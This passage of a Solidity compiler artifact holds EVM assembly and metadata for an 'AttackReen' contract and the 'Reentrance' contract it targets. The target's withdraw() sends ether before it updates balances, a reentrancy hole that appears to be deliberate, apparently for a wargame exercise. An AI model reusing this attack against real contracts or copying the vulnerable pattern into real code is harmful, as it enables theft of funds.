											"begin": 372,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 372,
											"end": 473,
											"name": "SWAP2"
										},
										{
											"begin": 372,
											"end": 473,
											"name": "POP"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "POP"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "POP"
										},
										{
											"begin": 337,
											"end": 480,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "JUMPDEST"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "SLOAD"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "DUP2"
										},
										{
											"begin": 193,
											"end": 221,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "JUMPDEST"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "DUP1"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "SWAP1"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "SLOAD"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "SWAP1"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "EXP"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "SWAP1"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "DIV"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 275,
											"end": 276,
											"name": "AND"
										},
										{
											"begin": 275,
											"end": 283,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 275,
											"end": 283,
											"name": "AND"
										},
										{
											"begin": 275,
											"end": 283,
											"name": "PUSH",
											"value": "362A95"
										},
										{
											"begin": 290,
											"end": 296,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 290,
											"end": 296,
											"name": "SLOAD"
										},
										{
											"begin": 302,
											"end": 309,
											"name": "PUSH",
											"value": "3D0900"
										},
										{
											"begin": 275,
											"end": 310,
											"name": "SWAP1"
										},
										{
											"begin": 319,
											"end": 323,
											"name": "ADDRESS"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "MLOAD"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP5"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "AND"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "SHL"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP2"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "MSTORE"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "ADD"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP1"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP3"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "AND"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "AND"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP2"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "MSTORE"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "ADD"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "SWAP2"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "MLOAD"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP1"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP4"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "SUB"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP2"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP6"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP10"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP1"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "DUP9"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "CALL"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 275,
											"end": 325,
											"name": "POP"
										},
										{
											"begin": 228,
											"end": 332,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"amount()": "aa8c217c",
							"attack()": "9e5faafc",
							"contribute()": "d7bb99ba",
							"r()": "6c8ae38c"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contribute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"r\",\"outputs\":[{\"internalType\":\"contract Reentrance\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/AttackReen.sol\":\"AttackReen\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/AttackReen.sol\":{\"keccak256\":\"0x75638dfcbe72c0e81cdc7b7b6cd15b3f9a3ebcea1c823a12b9d7e00168e126d2\",\"urls\":[\"bzz-raw://1ea36224a0631013b0b0dc25ac417c02f73b4e4ca74ce6f2c0ca55ce4584594e\",\"dweb:/ipfs/QmctzYXsMJJhrf1c97T1XZgDiXTYeta3TwpcjDvPwRPc58\"]},\"contracts/Reentrance.sol\":{\"keccak256\":\"0x42df610a7e72fcb18477c47526eff4e80306718231582dccb9fb7d40bc1e73a3\",\"urls\":[\"bzz-raw://22628ea2c4c9510d98b7e5ccce66d67250e8e557015814d1f95af9c4b120739c\",\"dweb:/ipfs/QmPkLo2bsz7pTKM4HUF1S8DbDC9gThg3YuA9qfRUevsCbb\"]},\"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contracts/AttackReen.sol:AttackReen",
								"label": "r",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Reentrance)152"
							},
							{
								"astId": 10,
								"contract": "contracts/AttackReen.sol:AttackReen",
								"label": "amount",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_contract(Reentrance)152": {
								"encoding": "inplace",
								"label": "contract Reentrance",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"contracts/Reentrance.sol": {
				"Reentrance": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_who",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "balance",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balances",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_to",
									"type": "address"
								}
							],
							"name": "donate",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_amount",
									"type": "uint256"
								}
							],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/Reentrance.sol\":139:717  contract Reentrance {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"contracts/Reentrance.sol\":139:717  contract Reentrance {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Reentrance.sol\":139:717  contract Reentrance {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x362a95\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x27e235e3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x2e1a7d4d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Reentrance.sol\":241:340  function donate(address _to) public payable {... */\n    tag_3:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"contracts/Reentrance.sol\":241:340  function donate(address _to) public payable {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/Reentrance.sol\":196:236  mapping(address => uint) public balances */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"contracts/Reentrance.sol\":196:236  mapping(address => uint) public balances */\n      pop\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_14:\n        /* \"contracts/Reentrance.sol\":196:236  mapping(address => uint) public balances */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_15\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrance.sol\":448:682  function withdraw(uint _amount) public {... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_16:\n        /* \"contracts/Reentrance.sol\":448:682  function withdraw(uint _amount) public {... */\n      pop\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_18:\n        /* \"contracts/Reentrance.sol\":448:682  function withdraw(uint _amount) public {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_19\n      jump\t// in\n    tag_17:\n      stop\n        /* \"contracts/Reentrance.sol\":344:444  function balanceOf(address _who) public view returns (uint balance) {... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_20:\n        /* \"contracts/Reentrance.sol\":344:444  function balanceOf(address _who) public view returns (uint balance) {... */\n      pop\n      tag_21\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_22:\n        /* \"contracts/Reentrance.sol\":344:444  function balanceOf(address _who) public view returns (uint balance) {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_23\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Reentrance.sol\":241:340  function donate(address _to) public payable {... */\n    tag_11:\n        /* \"contracts/Reentrance.sol\":307:335  balances[_to].add(msg.value) */\n      tag_25\n        /* \"contracts/Reentrance.sol\":325:334  msg.value */\n      callvalue\n        /* \"contracts/Reentrance.sol\":307:315  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":307:320  balances[_to] */\n      dup1\n        /* \"contracts/Reentrance.sol\":316:319  _to */\n      dup5\n        /* \"contracts/Reentrance.sol\":307:320  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":307:324  balances[_to].add */\n      tag_26\n      swap1\n        /* \"contracts/Reentrance.sol\":307:335  balances[_to].add(msg.value) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_25:\n        /* \"contracts/Reentrance.sol\":291:299  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":291:304  balances[_to] */\n      dup1\n        /* \"contracts/Reentrance.sol\":300:303  _to */\n      dup4\n        /* \"contracts/Reentrance.sol\":291:304  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Reentrance.sol\":291:335  balances[_to] = balances[_to].add(msg.value) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Reentrance.sol\":241:340  function donate(address _to) public payable {... */\n      pop\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":196:236  mapping(address => uint) public balances */\n    tag_15:\n      mstore(0x20, 0x00)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":448:682  function withdraw(uint _amount) public {... */\n    tag_19:\n        /* \"contracts/Reentrance.sol\":520:527  _amount */\n      dup1\n        /* \"contracts/Reentrance.sol\":496:504  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":496:516  balances[msg.sender] */\n      dup1\n        /* \"contracts/Reentrance.sol\":505:515  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":496:516  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":496:527  balances[msg.sender] >= _amount */\n      lt\n        /* \"contracts/Reentrance.sol\":493:678  if(balances[msg.sender] >= _amount) {... */\n      tag_28\n      jumpi\n        /* \"contracts/Reentrance.sol\":538:549  bool result */\n      0x00\n        /* \"contracts/Reentrance.sol\":554:564  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":554:569  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Reentrance.sol\":576:583  _amount */\n      dup3\n        /* \"contracts/Reentrance.sol\":554:588  msg.sender.call.value(_amount)(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_31\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_30)\n        /* \"--CODEGEN--\":14:41   */\n    tag_31:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_30:\n      pop\n        /* \"contracts/Reentrance.sol\":537:588  (bool result,) = msg.sender.call.value(_amount)(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/Reentrance.sol\":664:671  _amount */\n      dup2\n        /* \"contracts/Reentrance.sol\":640:648  balances */\n      0x00\n        /* \"contracts/Reentrance.sol\":640:660  balances[msg.sender] */\n      dup1\n        /* \"contracts/Reentrance.sol\":649:659  msg.sender */\n      caller\n        /* \"contracts/Reentrance.sol\":640:660  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/Reentrance.sol\":640:671  balances[msg.sender] -= _amount */\n      dup3\n      dup3\n      sload\n      sub\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Reentrance.sol\":493:678  if(balances[msg.sender] >= _amount) {... */\n      pop\n    tag_28:\n        /* \"contracts/Reentrance.sol\":448:682  function withdraw(uint _amount) public {... */\n      pop\n      jump\t// out\n        /* \"contracts/Reentrance.sol\":344:444  function balanceOf(address _who) public view returns (uint balance) {... */\n    tag_23:\n        /* \"contracts/Reentrance.sol\":398:410  uint balance */\n      0x00\n        /* \"contracts/Reentrance.sol\":425:433  balances */\n      dup1\n        /* \"contracts/Reentrance.sol\":425:439  balances[_who] */\n      0x00\n        /* \"contracts/Reentrance.sol\":434:438  _who */\n      dup4\n        /* \"contracts/Reentrance.sol\":425:439  balances[_who] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Reentrance.sol\":418:439  return balances[_who] */\n      swap1\n      pop\n        /* \"contracts/Reentrance.sol\":344:444  function balanceOf(address _who) public view returns (uint balance) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2690:2865  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_26:\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2748:2755  uint256 */\n      0x00\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2767:2776  uint256 c */\n      dup1\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2783:2784  b */\n      dup3\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2779:2780  a */\n      dup5\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2779:2784  a + b */\n      add\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2767:2784  uint256 c = a + b */\n      swap1\n      pop\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2807:2808  a */\n      dup4\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2802:2803  c */\n      dup2\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2802:2808  c >= a */\n      lt\n      iszero\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2794:2840  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_35\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_35:\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2857:2858  c */\n      dup1\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2850:2858  return c */\n      swap2\n      pop\n      pop\n        /* \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\":2690:2865  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220cc5806491c2f51c40f3ffffaf6c376a5017dd05188846344fe641e387702614564736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
